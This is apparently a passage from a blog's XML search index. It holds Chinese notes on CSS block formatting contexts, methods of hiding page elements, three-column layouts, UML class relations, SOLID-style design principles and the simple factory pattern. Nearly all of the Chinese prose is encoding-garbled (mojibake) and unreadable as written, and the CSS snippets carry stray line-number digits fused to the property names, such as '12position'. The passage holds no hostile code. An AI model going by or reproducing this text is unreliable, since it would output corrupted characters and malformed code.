¼å¼åŒ–ä¸Šä¸‹æ–‡çš„åŽä»£å…ƒç´ å†…çš„å…ƒç´ ã€‚ BFC çš„åº”ç”¨ é˜²æ­¢ margin é‡å  (åŒä¸€ä¸ªBFCå†…çš„ä¸¤ä¸ªä¸¤ä¸ªç›¸é‚»Boxçš„ margin ä¼šå‘ç”Ÿé‡å ï¼Œè§¦å‘ç”Ÿæˆä¸¤ä¸ªBFCï¼Œå³ä¸ä¼šé‡å ) æ¸…é™¤å†…éƒ¨æµ®åŠ¨ (åˆ›å»ºä¸€ä¸ªæ–°çš„ BFCï¼Œå› ä¸ºæ ¹æ® BFC çš„è§„åˆ™ï¼Œè®¡ç®— BFC çš„é«˜åº¦æ—¶ï¼Œæµ®åŠ¨å…ƒç´ ä¹Ÿå‚ä¸Žè®¡ç®—) è‡ªé€‚åº”å¤šæ å¸ƒå±€ (BFCçš„åŒºåŸŸä¸ä¼šä¸Žfloat boxé‡å ã€‚å› æ­¤ï¼Œå¯ä»¥è§¦å‘ç”Ÿæˆä¸€ä¸ªæ–°çš„BFC) W3Cå¯¹BFCçš„å®šä¹‰å¦‚ä¸‹ï¼š1æµ®åŠ¨å…ƒç´ å’Œç»å¯¹å®šä½å…ƒç´ ï¼Œéžå—çº§ç›’å­çš„å—çº§å®¹å™¨ï¼ˆä¾‹å¦‚ inline-blocks, table-cells, å’Œ table-captionsï¼‰ï¼Œä»¥åŠoverflowå€¼ä¸ä¸ºâ€œvisiableâ€çš„å—çº§ç›’å­ï¼Œéƒ½ä¼šä¸ºä»–ä»¬çš„å†…å®¹åˆ›å»ºæ–°çš„BFCï¼ˆå—çº§æ ¼å¼ä¸Šä¸‹æ–‡ï¼‰ã€‚ ä¸ºäº†ä¾¿äºŽç†è§£ï¼Œæˆ‘ä»¬æ¢ä¸€ç§æ–¹å¼æ¥é‡æ–°å®šä¹‰BFCã€‚ä¸€ä¸ªHTMLå…ƒç´ è¦åˆ›å»ºBFCï¼Œåˆ™æ»¡è¶³ä¸‹åˆ—çš„ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ªæ¡ä»¶å³å¯ï¼š 1ã€floatçš„å€¼ä¸æ˜¯noneã€‚2ã€positionçš„å€¼ä¸æ˜¯staticæˆ–è€…relativeã€‚3ã€displayçš„å€¼æ˜¯inline-blockã€table-cellã€flexã€table-captionæˆ–è€…inline-flex4ã€overflowçš„å€¼ä¸æ˜¯visible BFCæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¸ƒå±€çŽ¯å¢ƒï¼Œå…¶ä¸­çš„å…ƒç´ å¸ƒå±€æ˜¯ä¸å—å¤–ç•Œçš„å½±å“ï¼Œå¹¶ä¸”åœ¨ä¸€ä¸ªBFCä¸­ï¼Œå—ç›’ä¸Žè¡Œç›’ï¼ˆè¡Œç›’ç”±ä¸€è¡Œä¸­æ‰€æœ‰çš„å†…è”å…ƒç´ æ‰€ç»„æˆï¼‰éƒ½ä¼šåž‚ç›´çš„æ²¿ç€å…¶çˆ¶å…ƒç´ çš„è¾¹æ¡†æŽ’åˆ—ã€‚ éšè—é¡µé¢ä¸­çš„æŸä¸ªå…ƒç´ çš„æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ éšè—ç±»åž‹ å±å¹•å¹¶ä¸æ˜¯å”¯ä¸€çš„è¾“å‡ºæœºåˆ¶ï¼Œæ¯”å¦‚è¯´å±å¹•ä¸Šçœ‹ä¸è§çš„å…ƒç´ ï¼ˆéšè—çš„å…ƒç´ ï¼‰ï¼Œå…¶ä¸­ä¸€äº›ä¾ç„¶èƒ½å¤Ÿè¢«è¯»å±è½¯ä»¶é˜…è¯»å‡ºæ¥ï¼ˆå› ä¸ºè¯»å±è½¯ä»¶ä¾èµ–äºŽå¯è®¿é—®æ€§æ ‘æ¥é˜è¿°ï¼‰ã€‚ä¸ºäº†æ¶ˆé™¤å®ƒä»¬ä¹‹é—´çš„æ­§ä¹‰ï¼Œæˆ‘ä»¬å°†å…¶å½’ä¸ºä¸‰å¤§ç±»ï¼š å®Œå…¨éšè—ï¼šå…ƒç´ ä»Žæ¸²æŸ“æ ‘ä¸­æ¶ˆå¤±ï¼Œä¸å æ®ç©ºé—´ã€‚ è§†è§‰ä¸Šçš„éšè—ï¼šå±å¹•ä¸­ä¸å¯è§ï¼Œå æ®ç©ºé—´ã€‚ è¯­ä¹‰ä¸Šçš„éšè—ï¼šè¯»å±è½¯ä»¶ä¸å¯è¯»ï¼Œä½†æ­£å¸¸å æ®ç©ºã€‚ å®Œå…¨éšè— 1.display å±žæ€§ 1display: none; 2.hidden å±žæ€§ HTML5 æ–°å¢žå±žæ€§ï¼Œç›¸å½“äºŽ display: none 12&lt;div hidden&gt;&lt;/div&gt; dipslay:none,visibility:hiddenéƒ½ä¼šè¢«æž„å»ºDOMæ ‘ è§£æžHTMLæž„å»ºDOMæ ‘åœ¨å‰é¢ï¼›è€Œæ ·å¼çš„åŠ è½½åœ¨åŽé¢ dispaly:noneçš„å…ƒç´ ä¸ä¼šè¢«åŠ å…¥åˆ°Render Tree è€Œvisibility:hiddençš„å…ƒç´ ä¼šè¢«åŠ å…¥åˆ°Render Treeï¼› è§†è§‰ä¸Šçš„éšè— 1.åˆ©ç”¨ position å’Œ ç›’æ¨¡åž‹ å°†å…ƒç´ ç§»å‡ºå¯è§†åŒºèŒƒå›´ è®¾ç½® posoition ä¸º absolute æˆ– fixedï¼Œé€šè¿‡è®¾ç½® topã€left ç­‰å€¼ï¼Œå°†å…¶ç§»å‡ºå¯è§†åŒºåŸŸã€‚ 12position:absolute;left: -99999px; è®¾ç½® position ä¸º relativeï¼Œé€šè¿‡è®¾ç½® topã€left ç­‰å€¼ï¼Œå°†å…¶ç§»å‡ºå¯è§†åŒºåŸŸã€‚ 123position: relative;left: -99999px;height: 0 è®¾ç½® margin å€¼ï¼Œå°†å…¶ç§»å‡ºå¯è§†åŒºåŸŸèŒƒå›´ï¼ˆå¯è§†åŒºåŸŸå ä½ï¼‰ã€‚ 12margin-left: -99999px;height: 0; 2.åˆ©ç”¨ transfrom ç¼©æ”¾ 12transform: scale(0);height: 0; ç§»åŠ¨ translateX, translateY 12transform: translateX(-99999px);height: 0 æ—‹è½¬ rotate 1transform: rotateY(90deg); 3.è®¾ç½®å…¶å¤§å°ä¸º0 å®½é«˜ä¸º0ï¼Œå­—ä½“å¤§å°ä¸º0ï¼š 123height: 0;width: 0;font-size: 0; å®½é«˜ä¸º0ï¼Œè¶…å‡ºéšè—: 123height: 0;width: 0;overflow: hidden; 4.è®¾ç½®é€æ˜Žåº¦ä¸º0 1opacity: 0; 5.visibilityå±žæ€§ 1visibility: hidden; 6.å±‚çº§è¦†ç›–ï¼Œz-index å±žæ€§ 12position: relative;z-index: -999; å†è®¾ç½®ä¸€ä¸ªå±‚çº§è¾ƒé«˜çš„å…ƒç´ è¦†ç›–åœ¨æ­¤å…ƒç´ ä¸Šã€‚ 7.clip-path è£å‰ª 1clip-path: polygon(0 0, 0 0, 0 0, 0 0); è¯­ä¹‰ä¸Šçš„éšè— aria-hidden å±žæ€§ è¯»å±è½¯ä»¶ä¸å¯è¯»ï¼Œå æ®ç©ºé—´ï¼Œå¯è§ã€‚ 12&lt;div aria-hidden="true"&gt;&lt;/div&gt; åœ£æ¯å¸ƒå±€å’ŒåŒé£žç¿¼å¸ƒå±€çš„ç†è§£ä¸Žæ€è€ƒhttps://www.jianshu.com/p/81ef7e7094e8 ä¸¤ä¾§å®½åº¦å›ºå®šï¼Œä¸­é—´å®½åº¦è‡ªé€‚åº” ä¸­é—´éƒ¨åˆ†åœ¨DOMç»“æž„ä¸Šä¼˜å…ˆï¼Œä»¥ä¾¿å…ˆè¡Œæ¸²æŸ“ å…è®¸ä¸‰åˆ—ä¸­çš„ä»»æ„ä¸€åˆ—æˆä¸ºæœ€é«˜åˆ— åªéœ€è¦ä½¿ç”¨ä¸€ä¸ªé¢å¤–çš„&lt;div&gt;æ ‡ç­¾]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FdesignPattern%2F</url>
    <content type="text"><![CDATA[å‰è¨€ è®¾è®¡æ¨¡å¼è½¯ä»¶æ¨¡å¼æ˜¯å°†æ¨¡å¼çš„ä¸€èˆ¬æ¦‚å¿µåº”ç”¨äºŽè½¯ä»¶å¼€å‘é¢†åŸŸï¼Œå³è½¯ä»¶å¼€å‘çš„ æ€»ä½“æŒ‡å¯¼æ€è·¯æˆ–å‚ç…§æ ·æ¿ã€‚è½¯ä»¶æ¨¡å¼å¹¶éžä»…é™äºŽè®¾è®¡æ¨¡å¼ï¼Œè¿˜åŒ…æ‹¬ æž¶æž„æ¨¡å¼ã€åˆ†æžæ¨¡å¼å’Œè¿‡ç¨‹æ¨¡å¼ç­‰ï¼Œå®žé™…ä¸Šï¼Œåœ¨è½¯ä»¶ç”Ÿå­˜æœŸçš„æ¯ä¸€ä¸ªé˜¶æ®µéƒ½å­˜åœ¨ç€ä¸€äº›è¢«è®¤åŒçš„æ¨¡å¼ã€‚ ä»€ä¹ˆæ˜¯è®¾è®¡æ¨¡å¼UMLç±»å›¾Â·ç±»å›¾ç»“æž„ä¸º&lt;&gt;ï¼Œè¡¨ç¤ºä¸ºä¸€ä¸ªæŠ½è±¡ç±»ï¼›Â·ç»§æ‰¿ç±»å’ŒæŠ½è±¡ç±»ä¹‹é—´çš„å…³ç³»ä¸ºå®žçŽ°å…³ç³»ï¼Œä½¿ç”¨å¸¦ç©ºå¿ƒç®­å¤´çš„è™šçº¿è¡¨ç¤ºï¼›Â·ç»§æ‰¿ç±»ä¸Žå®žä¾‹ä¹‹é—´æ˜¯ç»§æ‰¿å…³ç³»ï¼Œå®ƒä»¬ä¹‹é—´çš„å…³ç³»ä¸ºæ³›åŒ–å…³ç³»ï¼Œä½¿ç”¨å¸¦ç©ºå¿ƒç®­å¤´çš„å®žçº¿è¡¨ç¤ºï¼›Â·å®žä¾‹ä¸Žå®žä¾‹éƒ¨ä»¶ä¹‹é—´æ˜¯ç»„åˆå…³ç³»ï¼Œä½¿ç”¨å¸¦å®žå¿ƒç®­å¤´çš„å®žçº¿è¡¨ç¤ºï¼›Â·å®žä¾‹ä¸Žç”¨æˆ·ä¹‹é—´æ˜¯ä¸€ç§ä¾èµ–å…³ç³»ï¼Œä½¿ç”¨å¸¦ç®­å¤´çš„è™šçº¿è¡¨ç¤ºï¼›Â·ç”¨æˆ·ä¸Žç”¨æˆ·ç¾¤ä¹‹é—´æ˜¯èšåˆå…³ç³»ï¼Œä½¿ç”¨å¸¦ç©ºå¿ƒç®­å¤´çš„å®žçº¿è¡¨ç¤ºï¼›Â·ç”¨æˆ·ä¸Žèº«ä»½è¯æ˜Žä¹‹é—´ä¸ºå…³è”å…³ç³»ï¼Œä½¿ç”¨ä¸€æ ¹å®žçº¿è¡¨ç¤ºï¼› ç±»ä¹‹é—´çš„å…³ç³»ç»§æ‰¿å…³ç³»å®žä¾‹-&gt;ç»§æ‰¿ç±»-&gt;æŠ½è±¡ç±» æ³›åŒ– å®žçŽ° ä¸ªä½“å’Œé›†ä½“çš„å…³ç³»èšåˆ å¼±ä¾èµ–ç»„åˆ å¼ºä¾èµ– ä¸åŒç±»å¯¹è±¡ä¹‹é—´å…³ç³»å…³è”æ˜¯é™æ€å¼ºå…³è”å…³ç³»ï¼Œæè¿°ä¸åŒç±»çš„å¯¹è±¡ä¹‹é—´çš„ç»“æž„å…³ç³»ï¼Œå¯¹è±¡å¸¸é€šè¿‡æˆå‘˜å˜é‡å®žçŽ°ï¼Œä¾èµ–æ˜¯ä¸´æ—¶æ€§å…³ç³»ï¼Œæè¿°ä¸€ä¸ªå¯¹è±¡è¿è¡ŒæœŸé—´ä¼šè¦åˆ°å¦ä¸€ä¸ªå¯¹è±¡çš„å…³ç³»ï¼Œå°½é‡å•å‘ä¾èµ– æ—¶åºå›¾æ—¶åºå›¾æ˜¯æ˜¾ç¤ºå¯¹è±¡ä¹‹é—´äº¤äº’çš„å›¾ï¼Œè¿™äº›å¯¹è±¡æ˜¯æŒ‰æ—¶é—´é¡ºåºæŽ’åˆ—çš„ã€‚æ—¶åºå›¾ä¸­æ˜¾ç¤ºçš„æ˜¯å‚ä¸Žäº¤äº’çš„å¯¹è±¡åŠå…¶å¯¹è±¡ä¹‹é—´æ¶ˆæ¯äº¤äº’çš„é¡ºåºã€‚ æ—¶åºå›¾ï¼ˆSequence Diagramï¼‰åŒ…æ‹¬çš„å»ºæ¨¡å…ƒç´ ä¸»è¦æœ‰ï¼šå¯¹è±¡ï¼ˆActorï¼‰ã€ç”Ÿå‘½çº¿ï¼ˆLifelineï¼‰ã€æŽ§åˆ¶ç„¦ç‚¹ï¼ˆFocus of controlï¼‰ã€æ¶ˆæ¯ï¼ˆMessageï¼‰ç­‰ç­‰ã€‚ å…­å¤§è®¾è®¡åŽŸåˆ™1)å•ä¸€èŒè´£åŽŸåˆ™è¯¥åŽŸåˆ™æ˜¯é’ˆå¯¹ç±»æ¥è¯´çš„ï¼Œå³ä¸€ä¸ªç±»åº”è¯¥åªè´Ÿè´£ä¸€é¡¹èŒè´£ã€‚å¦‚ç±»Tè´Ÿè´£ä¸¤ä¸ªä¸åŒèŒè´£ï¼šèŒè´£P1ï¼ŒèŒè´£P2ã€‚å½“èŒè´£P1éœ€æ±‚å˜æ›´è€Œæ”¹å˜Tæ—¶ï¼Œå¯èƒ½é€ æˆèŒè´£P2å‘ç”Ÿæ•…éšœï¼Œæ‰€ä»¥éœ€è¦å°†ç±»Tçš„ç²’åº¦åˆ†è§£ä¸ºT1ï¼ŒT2ã€‚éµå¾ªå•ä¸€èŒè´£çš„ä¼˜ç‚¹ï¼š a)é™ä½Žç±»çš„å¤æ‚åº¦ï¼Œä¸€ä¸ªç±»åªè´Ÿè´£ä¸€é¡¹èŒè´£ã€‚ b)æé«˜ç±»çš„å¯è¯»æ€§ï¼Œå¯ç»´æŠ¤æ€§ v)é™ä½Žå˜æ›´å¼•èµ·çš„é£Žé™©ã€‚ 2)é‡Œæ°æ›¿æ¢åŽŸåˆ™å¦‚æžœå¯¹æ¯ä¸ªç±»åž‹ä¸ºT1çš„å¯¹è±¡o1ï¼Œéƒ½æœ‰ç±»åž‹ä¸ºT2çš„å¯¹è±¡o2ï¼Œä½¿å¾—ä»¥T1å®šä¹‰çš„æ‰€æœ‰ç¨‹åºPåœ¨æ‰€æœ‰çš„å¯¹è±¡o1éƒ½ä»£æ¢æˆo2æ—¶ï¼Œç¨‹åºPçš„è¡Œä¸ºæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç±»åž‹T2æ˜¯ç±»åž‹T1çš„å­ç±»åž‹ã€‚æ¢å¥è¯è¯´ï¼Œæ‰€æœ‰å¼•ç”¨åŸºç±»çš„åœ°æ–¹å¿…é¡»èƒ½é€æ˜Žåœ°ä½¿ç”¨å…¶å­ç±»çš„å¯¹è±¡ã€‚ ç”±å®šä¹‰å¯çŸ¥ï¼Œåœ¨ä½¿ç”¨ç»§æ‰¿æ—¶ï¼Œéµå¾ªé‡Œæ°æ›¿æ¢åŽŸåˆ™ï¼Œåœ¨å­ç±»ä¸­å°½é‡ä¸è¦é‡å†™å’Œé‡è½½çˆ¶ç±»çš„æ–¹æ³•ã€‚ç»§æ‰¿åŒ…å«è¿™æ ·ä¸€å±‚å«ä¹‰ï¼šçˆ¶ç±»ä¸­å‡¡æ˜¯å·²ç»å®žçŽ°å¥½çš„æ–¹æ³•ï¼ˆç›¸å¯¹æŠ½è±¡æ–¹æ³•è€Œè¨€ï¼‰ï¼Œå®žé™…ä¸Šæ˜¯åœ¨è®¾å®šä¸€ç³»åˆ—çš„è§„èŒƒå’Œå¥‘çº¦ï¼Œè™½ç„¶å®ƒä¸å¼ºåˆ¶è¦æ±‚æ‰€æœ‰çš„å­ç±»å¿…é¡»éµå¾ªè¿™äº›å¥‘çº¦ï¼Œä½†æ˜¯å¦‚æžœå­ç±»å¯¹è¿™äº›éžæŠ½è±¡æ–¹æ³•ä»»æ„ä¿®æ”¹ï¼Œå°±ä¼šå¯¹æ•´ä¸ªç»§æ‰¿ä½“ç³»é€ æˆç ´åã€‚è€Œé‡Œæ°æ›¿æ¢åŽŸåˆ™å°±æ˜¯è¡¨è¾¾äº†è¿™ä¸€å±‚å«ä¹‰ã€‚ç»§æ‰¿ä½œä¸ºé¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§ä¹‹ä¸€ï¼Œåœ¨ç»™ç¨‹åºè®¾è®¡å¸¦æ¥å·¨å¤§éåŽ†çš„åŒæ—¶ï¼Œä¹Ÿå¸¦æ¥äº†å¼Šç«¯ã€‚æ¯”å¦‚ä½¿ç”¨ç»§æ‰¿ä¼šç»™ç¨‹åºå¸¦æ¥ä¾µå…¥æ€§ï¼Œç¨‹åºçš„å¯ç§»æ¤æ€§é™ä½Žï¼Œå¢žåŠ å¯¹è±¡é—´çš„è€¦åˆæ€§ï¼Œå¦‚æžœä¸€ä¸ªç±»è¢«å…¶ä»–çš„ç±»æ‰€ç»§æ‰¿ï¼Œåˆ™å½“è¿™ä¸ªç±»éœ€è¦ä¿®æ”¹æ—¶ï¼Œå¿…é¡»è€ƒè™‘åˆ°æ‰€æœ‰çš„å­ç±»ï¼Œå¹¶ä¸”çˆ¶ç±»ä¿®æ”¹åŽï¼Œæ‰€æœ‰æ¶‰åŠåˆ°å­ç±»çš„åŠŸèƒ½éƒ½æœ‰å¯èƒ½äº§ç”Ÿæ•…éšœã€‚ 3)ä¾èµ–å€’è½¬åŽŸåˆ™ç¨‹åºè¦ä¾èµ–äºŽæŠ½è±¡æŽ¥å£ï¼Œä¸è¦ä¾èµ–äºŽå…·ä½“å®žçŽ°ã€‚é«˜å±‚æ¬¡çš„æ¨¡å—ä¸åº”è¯¥ä¾èµ–äºŽä½Žå±‚æ¬¡çš„æ¨¡å—ï¼Œä»–ä»¬éƒ½åº”è¯¥ä¾èµ–äºŽæŠ½è±¡ã€‚æŠ½è±¡ä¸åº”è¯¥ä¾èµ–äºŽå…·ä½“ï¼Œå…·ä½“åº”è¯¥ä¾èµ–äºŽæŠ½è±¡ã€‚ç®€å•çš„è¯´å°±æ˜¯è¦æ±‚å¯¹æŠ½è±¡è¿›è¡Œç¼–ç¨‹ï¼Œä¸è¦å¯¹å®žçŽ°è¿›è¡Œç¼–ç¨‹ï¼Œè¿™æ ·å°±é™ä½Žäº†å®¢æˆ·ä¸Žå®žçŽ°æ¨¡å—é—´çš„è€¦åˆã€‚ 4)æŽ¥å£éš”ç¦»åŽŸåˆ™å®¢æˆ·ç«¯ä¸åº”è¯¥ä¾èµ–å®ƒä¸éœ€è¦çš„æŽ¥å£ï¼›ä¸€ä¸ªç±»å¯¹å¦ä¸€ä¸ªç±»çš„ä¾èµ–åº”è¯¥å»ºç«‹åœ¨æœ€å°çš„æŽ¥å£ä¸Šã€‚ 5)è¿ªç±³ç‰¹æ³•åˆ™ä¸€ä¸ªè½¯ä»¶å®žä½“åº”å½“å°½å¯èƒ½å°‘çš„ä¸Žå…¶ä»–å®žä½“å‘ç”Ÿç›¸äº’ä½œç”¨ã€‚æ¯ä¸€ä¸ªè½¯ä»¶å•ä½å¯¹å…¶ä»–çš„å•ä½éƒ½åªæœ‰æœ€å°‘çš„çŸ¥è¯†ï¼Œè€Œä¸”å±€é™äºŽé‚£äº›ä¸Žæœ¬å•ä½å¯†åˆ‡ç›¸å…³çš„è½¯ä»¶å•ä½ã€‚è¿ªç±³ç‰¹æ³•åˆ™çš„åˆè¡·åœ¨äºŽé™ä½Žç±»ä¹‹é—´çš„è€¦åˆã€‚ç”±äºŽæ¯ä¸ªç±»å°½é‡å‡å°‘å¯¹å…¶ä»–ç±»çš„ä¾èµ–ï¼Œå› æ­¤ï¼Œå¾ˆå®¹æ˜“ä½¿å¾—ç³»ç»Ÿçš„åŠŸèƒ½æ¨¡å—åŠŸèƒ½ç‹¬ç«‹ï¼Œç›¸äº’ä¹‹é—´ä¸å­˜åœ¨ï¼ˆæˆ–å¾ˆå°‘æœ‰ï¼‰ä¾èµ–å…³ç³»ã€‚è®¾è®¡æ¨¡å¼çš„é—¨é¢æ¨¡å¼ï¼ˆFacadeï¼‰å’Œä¸­ä»‹æ¨¡å¼ï¼ˆMediatorï¼‰ï¼Œéƒ½æ˜¯è¿ªç±³ç‰¹æ³•åˆ™åº”ç”¨çš„ä¾‹å­ã€‚ 6)å¼€é—­åŽŸåˆ™å¼€é—­åŽŸåˆ™ï¼ˆOCPï¼‰æ˜¯é¢å‘å¯¹è±¡è®¾è®¡ä¸­â€œå¯å¤ç”¨è®¾è®¡â€çš„åŸºçŸ³ï¼Œæ˜¯é¢å‘å¯¹è±¡è®¾è®¡ä¸­æœ€é‡è¦çš„åŽŸåˆ™ä¹‹ä¸€ï¼Œå…¶å®ƒå¾ˆå¤šçš„è®¾è®¡åŽŸåˆ™éƒ½æ˜¯å®žçŽ°å¼€é—­åŽŸåˆ™çš„ä¸€ç§æ‰‹æ®µã€‚å¯¹äºŽæ‰©å±•æ˜¯å¼€æ”¾çš„ï¼Œå¯¹äºŽä¿®æ”¹æ˜¯å…³é—­çš„ï¼Œè¿™æ„å‘³ç€æ¨¡å—çš„è¡Œä¸ºæ˜¯å¯ä»¥æ‰©å±•çš„ã€‚å½“åº”ç”¨çš„éœ€æ±‚æ”¹å˜æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ¨¡å—è¿›è¡Œæ‰©å±•ï¼Œä½¿å…¶å…·æœ‰æ»¡è¶³é‚£äº›æ”¹å˜çš„æ–°è¡Œä¸ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜æ¨¡å—çš„åŠŸèƒ½ã€‚å¯¹æ¨¡å—è¡Œä¸ºè¿›è¡Œæ‰©å±•æ—¶ï¼Œä¸å¿…æ”¹åŠ¨æ¨¡å—çš„æºä»£ç æˆ–è€…äºŒè¿›åˆ¶ä»£ç ã€‚ åˆ›å»ºåž‹æ¨¡å¼åˆ›å»ºåž‹æ¨¡å¼å¯¹ç±»çš„å®žä¾‹åŒ–è¿‡ç¨‹è¿›è¡Œäº†æŠ½è±¡ï¼Œèƒ½å¤Ÿå°†å¯¹è±¡çš„åˆ›å»ºä¸Žå¯¹è±¡çš„ä½¿ç”¨è¿‡ç¨‹åˆ†ç¦»ã€‚ ç®€å•å·¥åŽ‚æ¨¡å¼åœ¨ç®€å•å·¥åŽ‚æ¨¡å¼ä¸­ï¼Œå¯ä»¥æ ¹æ®å‚æ•°çš„ä¸åŒè¿”å›žä¸åŒç±»çš„å®žä¾‹ã€‚ç®€å•å·¥åŽ‚æ¨¡å¼ä¸“é—¨å®šä¹‰ä¸€ä¸ªç±»æ¥è´Ÿè´£åˆ›å»ºå…¶ä»–ç±»çš„å®žä¾‹ï¼Œè¢«åˆ›å»ºçš„å®žä¾‹é€šå¸¸éƒ½å…·æœ‰å…±åŒçš„çˆ¶ç±»ã€‚ ç®€å•å·¥åŽ‚æ¨¡å¼åŒ…å«å¦‚ä¸‹è§’è‰²ï¼šFactoryï¼šå·¥åŽ‚è§’è‰²å·¥åŽ‚è§’è‰²è´Ÿè´£å®žçŽ°åˆ›å»ºæ‰€æœ‰å®žä¾‹çš„å†…éƒ¨é€»è¾‘Productï¼šæŠ½è±¡äº§å“è§’è‰²æŠ½è±¡äº§å“è§’è‰²æ˜¯æ‰€åˆ›å»ºçš„æ‰€æœ‰å¯¹è±¡çš„çˆ¶ç±»ï¼Œè´Ÿè´£æè¿°æ‰€æœ‰å®žä¾‹æ‰€å…±æœ‰çš„å…¬å…±æŽ¥å£ConcreteProductï¼šå…·ä½“äº§å“è§’è‰²å…·ä½“äº§å“è§’è‰²æ˜¯åˆ›å»ºç›®æ ‡ï¼Œæ‰€æœ‰åˆ›å»ºçš„å¯¹è±¡éƒ½å……å½“è¿™ä¸ªè§’è‰²çš„æŸä¸ªå…·ä½“ç±»çš„å®žä¾‹ã€‚ æ¨¡å¼åˆ†æžå°†å¯¹è±¡çš„åˆ›å»ºå’Œå¯¹è±¡æœ¬èº«ä¸šåŠ¡å¤„ç†åˆ†ç¦»å¯ä»¥é™ä½Žç³»ç»Ÿçš„è€¦åˆåº¦ï¼Œä½¿å¾—ä¸¤è€…ä¿®æ”¹èµ·æ¥éƒ½ç›¸å¯¹å®¹æ˜“ã€‚åœ¨è°ƒç”¨å·¥åŽ‚ç±»çš„å·¥åŽ‚æ–¹æ³•æ—¶ï¼Œç”±äºŽå·¥åŽ‚æ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œä½¿ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œå¯é€šè¿‡ç±»åç›´æŽ¥è°ƒç”¨ï¼Œè€Œä¸”åªéœ€è¦ä¼ å…¥ä¸€ä¸ªç®€å•çš„å‚æ•°å³å¯ï¼Œåœ¨å®žé™…å¼€å‘ä¸­ï¼Œè¿˜å¯ä»¥åœ¨è°ƒç”¨æ—¶å°†æ‰€ä¼ å…¥çš„å‚æ•°ä¿å­˜åœ¨XMLç­‰æ ¼å¼çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹å‚æ•°æ—¶æ— é¡»ä¿®æ”¹ä»»ä½•æºä»£ç ã€‚ç®€å•å·¥åŽ‚æ¨¡å¼æœ€å¤§çš„é—®é¢˜åœ¨äºŽå·¥åŽ‚ç±»çš„èŒè´£ç›¸å¯¹è¿‡é‡ï¼Œå¢žåŠ æ–°çš„äº§å“éœ€è¦ä¿®æ”¹å·¥åŽ‚ç±»çš„åˆ¤æ–­é€»è¾‘ï¼Œè¿™ä¸€ç‚¹ä¸Žå¼€é—­åŽŸåˆ™æ˜¯ç›¸è¿èƒŒçš„ã€‚ç®€å•å·¥åŽ‚æ¨¡å¼çš„è¦ç‚¹åœ¨äºŽï¼šå½“ä½ éœ€è¦ä»€ä¹ˆï¼Œåªéœ€è¦ä¼ å…¥ä¸€ä¸ªæ­£ç¡®çš„å‚æ•°ï¼Œå°±å¯ä»¥èŽ·å–ä½ æ‰€éœ€è¦çš„å¯¹è±¡ï¼Œè€Œæ— é¡»çŸ¥é“å…¶åˆ›å»ºç»†èŠ‚ã€‚ ç®€å•å·¥åŽ‚æ¨¡å¼çš„ä¼˜ç‚¹å·¥åŽ‚ç±»å«æœ‰å¿…è¦çš„åˆ¤æ–­é€»è¾‘ï¼Œå¯ä»¥å†³å®šåœ¨ä»€ä¹ˆæ—¶å€™åˆ›å»ºå“ªä¸€ä¸ªäº§å“ç±»çš„å®žä¾‹ï¼Œå®¢æˆ·ç«¯å¯ä»¥å…é™¤ç›´æŽ¥åˆ›å»ºäº§å“å¯¹è±¡çš„è´£ä»»ï¼Œè€Œä»…ä»…â€œæ¶ˆè´¹â€äº§å“ï¼›ç®€å•å·¥åŽ‚æ¨¡å¼é€šè¿‡è¿™ç§åšæ³•å®žçŽ°äº†å¯¹è´£ä»»çš„åˆ†å‰²ï¼Œå®ƒæä¾›äº†ä¸“é—¨çš„å·¥åŽ‚ç±»ç”¨äºŽåˆ›å»ºå¯¹è±¡ã€‚å®¢æˆ·ç«¯æ— é¡»çŸ¥é“æ‰€åˆ›å»ºçš„å…·ä½“äº§å“ç±»çš„ç±»åï¼Œåªéœ€è¦çŸ¥é“å…·ä½“äº§å“ç±»æ‰€å¯¹åº”çš„å‚æ•°å³å¯ï¼Œå¯¹äºŽä¸€äº›å¤æ‚çš„ç±»åï¼Œé€šè¿‡ç®€å•å·¥åŽ‚æ¨¡å¼å¯ä»¥å‡å°‘ä½¿ç”¨è€…çš„è®°å¿†é‡ã€‚é€šè¿‡å¼•å…¥é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ä¸ä¿®æ”¹ä»»ä½•å®¢æˆ·ç«¯ä»£ç çš„æƒ…å†µä¸‹æ›´æ¢å’Œå¢žåŠ æ–°çš„å…·ä½“äº§å“ç±»ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šæé«˜äº†ç³»ç»Ÿçš„çµæ´»æ€§ã€‚ ç®€å•å·¥åŽ‚æ¨¡å¼çš„ç¼ºç‚¹ç”±äºŽå·¥åŽ‚ç±»é›†ä¸­äº†æ‰€æœ‰äº§å“åˆ›å»ºé€»è¾‘ï¼Œä¸€æ—¦ä¸èƒ½æ­£å¸¸å·¥ä½œï¼Œæ•´ä¸ªç³»ç»Ÿéƒ½è¦å—åˆ°å½±å“ã€‚ä½¿ç”¨ç®€å•å·¥åŽ‚æ¨¡å¼å°†ä¼šå¢žåŠ ç³»ç»Ÿä¸­ç±»çš„ä¸ªæ•°ï¼Œåœ¨ä¸€å®šç¨‹åºä¸Šå¢žåŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦å’Œç†è§£éš¾åº¦ã€‚ç³»ç»Ÿæ‰©å±•å›°éš¾ï¼Œä¸€æ—¦æ·»åŠ æ–°äº§å“å°±ä¸å¾—ä¸ä¿®æ”¹å·¥åŽ‚é€»è¾‘ï¼Œåœ¨äº§å“ç±»åž‹è¾ƒå¤šæ—¶ï¼Œæœ‰å¯èƒ½é€ æˆå·¥åŽ‚é€»è¾‘è¿‡äºŽå¤æ‚ï¼Œä¸åˆ©äºŽç³»ç»Ÿçš„æ‰©å±•å’Œç»´æŠ¤ã€‚ç®€å•å·¥åŽ‚æ¨¡å¼ç”±äºŽä½¿ç”¨äº†é™æ€å·¥åŽ‚æ–¹æ³•ï¼Œé€ æˆå·¥åŽ‚è§’è‰²æ— æ³•å½¢æˆåŸºäºŽç»§æ‰¿çš„ç­‰çº§ç»“æž„ã€‚ 